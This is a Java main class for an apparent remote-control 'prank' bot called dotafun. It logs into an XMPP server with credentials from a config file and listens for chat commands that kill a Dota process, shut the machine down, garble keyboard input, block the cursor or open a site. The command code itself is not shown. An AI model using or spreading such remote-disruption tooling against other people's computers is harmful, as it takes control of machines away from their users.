package com.home.dotafun.main;

import com.home.dotafun.bot.impl.BotImpl;
import com.home.dotafun.bot.command.Command;
import com.home.dotafun.bot.command.impl.*;
import com.home.dotafun.global_variables.DF;
import com.home.dotafun.protocol.messaging.handler.impl.MessageHandlerImpl;
import com.home.dotafun.protocol.messaging.impl.HttpMessagingProtocol;
import com.home.dotafun.protocol.messaging.impl.XmppMessagingProtocol;
import com.home.dotafun.util.DFRobot;
import com.home.dotafun.util.Tools;
import org.jivesoftware.smack.XMPPException;

import java.awt.*;
import java.util.HashMap;
import java.util.Map;
import java.util.Properties;

public class Main {
    private static boolean isPause = false;

    public static synchronized void pause() throws InterruptedException{
        isPause = true;
        while (isPause) {
            Main.class.wait();
        }
    }

    public static synchronized void resume() {
        if(DF.xmppMessagingProtocol != null) {
            DF.xmppMessagingProtocol.logout();
            DF.xmppMessagingProtocol.disconnect();
        }
        isPause = false;
        Main.class.notify();
    }

    private static void initFDRobot() {
        try {
            DF.dfRobot = new DFRobot();
        } catch (AWTException e) {
            System.out.println(e.getMessage());
        }
    }

    private static void initBot(Map<String, Command> commands) {
        DF.bot = new BotImpl();
        DF.bot.addCommand(commands);
    }

    private static void initHttp(String server, String id) {
        DF.httpMessagingProtocol = new HttpMessagingProtocol(server, id);
        DF.httpMessagingProtocol.addMessageHandler(new MessageHandlerImpl());
    }

    private static void initXmpp(String server, String domain, int port, String username, String password) {
        try {
            DF.xmppMessagingProtocol = new XmppMessagingProtocol(server, domain, port);
            DF.xmppMessagingProtocol.addMessageHandler(new MessageHandlerImpl());
            DF.xmppMessagingProtocol.login(username, password);
        } catch (XMPPException e) {
            System.out.println(e.getMessage());
        }
    }

    public static void main(String[] args) {
        Map<String, Command> commands = new HashMap<String, Command>();
        commands.put("help", new HelpCommand());
        commands.put("kill_dota", new KillDotaCommand());
        commands.put("open_site", new OpenSiteCommand());
        commands.put("shutdown", new ShutdownCommand());
        commands.put("show_desktop", new ShowDesktopCommand());
        commands.put("bugs_keyboard", new BugsKeyboardCommand());
        commands.put("exit", new ExitCommand());
        commands.put("block_cursor", new BlockCursorCommand());
        initBot(commands);

        initFDRobot();

        Properties properties = Tools.readPropertyFile("config.properties", "cp1251");
        String server = properties.getProperty("xmpp.server");
        String domain = properties.getProperty("xmpp.domain");
        int port = Integer.parseInt(properties.getProperty("xmpp.port"));
        String username = properties.getProperty("xmpp.username");
        String password = properties.getProperty("xmpp.password");
        initXmpp(server, domain, port, username, password);

        try {
            pause();
        } catch (InterruptedException e) {
            System.out.println(e.getMessage());
        }

        /*String server = DF.properties.getProperty("http.server");
        String id = DF.properties.getProperty("http.id");
        initHttp(server, id);*/

    }
}
